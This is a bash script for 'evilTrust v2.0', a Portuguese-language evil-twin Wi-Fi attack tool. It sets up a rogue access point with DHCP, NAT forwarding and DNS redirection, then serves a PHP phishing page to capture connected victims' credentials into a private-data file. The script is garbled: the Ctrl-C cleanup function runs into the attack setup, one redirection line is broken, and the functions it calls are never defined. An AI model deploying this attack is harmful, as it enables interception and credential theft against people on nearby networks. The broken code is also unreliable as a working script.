#!/bin/bash

# evilTrust v2.0, Autor @s4vitar (Marcelo Vázquez)

# Cores
corVerde="\e[0;32m\033[1m"
corFim="\033[0m\e[0m"
corVermelha="\e[0;31m\033[1m"
corAzul="\e[0;34m\033[1m"
corAmarela="\e[0;33m\033[1m"
corRoxa="\e[0;35m\033[1m"
corTurquesa="\e[0;36m\033[1m"
corCinza="\e[0;37m\033[1m"

trap ctrl_c INT

function ctrl_c(){
        echo -e "\n\n${corAmarela}[*]${corFim}${corCinza} Saindo...\n${corFim}"
        rm dnsmasq.conf hostapd.conf 2>/dev/null
        rm -r iface 2>/dev/null
        find \-name datos-privados.txt | xargs rm 2>/dev/null
        sleep 3; ifconfig wlan0mon down 2>/dev/null; sleep 1
        iwconfig wlan0mon mode monitor 2>/dev/null; sleep 1
        ifconfig wlan0mon up 2>/dev/null; airmon-ng stop wlan0mon > / dnsmasq.conf
        dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
        sleep 2

        echo -e "[*] Iniciando o servidor DHCP..."
        ifconfig $choosed_interface 192.168.1.1 netmask 255.255.255.0 > /dev/null 2>&1
        sleep 2

        echo -e "[*] Ativando IP forwarding...\n"
        echo 1 > /proc/sys/net/ipv4/ip_forward
        iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
        iptables -A FORWARD -i $choosed_interface -o eth0 -j ACCEPT
        sleep 2

        echo -e "[*] Iniciando o serviço DNS spoofing...\n"
        iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 8.8.8.8
        iptables -t nat -A PREROUTING -p tcp --dport 53 -j DNAT --to 8.8.8.8
        sleep 2

        echo -e "[*] Iniciando o ataque...\n"
        xterm -e "php -S 192.168.1.1:80 -t $PWD" &
        sleep 3

        dependencies; getCredentials
}

dependencies; startAttack
